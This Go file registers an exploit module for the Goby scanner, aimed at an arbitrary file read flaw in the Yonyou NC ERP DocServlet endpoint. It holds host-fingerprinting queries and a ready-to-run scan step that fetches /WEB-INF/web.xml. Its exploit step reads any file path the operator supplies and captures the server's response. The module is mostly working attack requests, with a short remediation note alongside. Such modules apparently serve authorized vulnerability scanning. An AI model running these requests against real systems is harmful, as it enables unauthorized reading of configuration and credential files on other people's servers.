package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC /service/~webrt/nc.uap.lfw.file.action.DocServlet File Read Vulnerability",
    "Description": "<p>Yonyou NC is an enterprise-level ERP software that provides a series of business management modules, including financial accounting, procurement management, sales management, etc. This vulnerability exists in the DocServlet interface of Yonyou NC, allowing attackers to read arbitrary files on the server through crafted requests, potentially leading to sensitive information disclosure and reduced system security.</p>",
    "Product": "yonyou-ERP-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-11-08",
    "PostTime": "2025-02-05",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to perform unauthorized file read operations to obtain sensitive information on the server, potentially leading to data leakage, privilege escalation, and further attacks.</p>",
    "Recommendation": "<p>It is recommended to strictly control access to the DocServlet interface, restricting unauthorized users' access. Additionally, upgrade to the latest version of Yonyou NC to fix this vulnerability and conduct regular security audits.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/WEB-INF/web.xml",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/WEB-INF/web.xml",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/service/~webrt/nc.uap.lfw.file.action.DocServlet?disp=/WEB-INF/web.xml",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</web-app>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/service/~webrt/nc.uap.lfw.file.action.DocServlet?disp={{{filePath}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "用友NC /service/~webrt/nc.uap.lfw.file.action.DocServlet 文件读取漏洞",
            "Product": "用友-ERP-NC",
            "Description": "<p>用友NC是一款企业级ERP软件，提供了一系列业务管理模块，包括财务会计、采购管理、销售管理等。该漏洞存在于用友NC的DocServlet接口，攻击者可以通过构造恶意请求读取服务器上的任意文件，可能导致敏感信息泄露和系统安全性降低。</p>",
            "Recommendation": "<p>建议对DocServlet接口进行严格的访问控制，限制未授权用户的访问。同时，升级到最新版本的用友NC以修复该漏洞，并定期进行安全审计。</p>",
            "Impact": "<p>该漏洞允许攻击者通过未授权的文件读取操作获取服务器上的敏感信息，可能导致数据泄露、权限提升和进一步的攻击。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Yonyou NC /service/~webrt/nc.uap.lfw.file.action.DocServlet File Read Vulnerability",
            "Product": "yonyou-ERP-NC",
            "Description": "<p>Yonyou NC is an enterprise-level ERP software that provides a series of business management modules, including financial accounting, procurement management, sales management, etc. This vulnerability exists in the DocServlet interface of Yonyou NC, allowing attackers to read arbitrary files on the server through crafted requests, potentially leading to sensitive information disclosure and reduced system security.</p>",
            "Recommendation": "<p>It is recommended to strictly control access to the DocServlet interface, restricting unauthorized users' access. Additionally, upgrade to the latest version of Yonyou NC to fix this vulnerability and conduct regular security audits.</p>",
            "Impact": "<p>This vulnerability allows attackers to perform unauthorized file read operations to obtain sensitive information on the server, potentially leading to data leakage, privilege escalation, and further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/service/~webrt/nc.uap.lfw.file.action.DocServlet"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}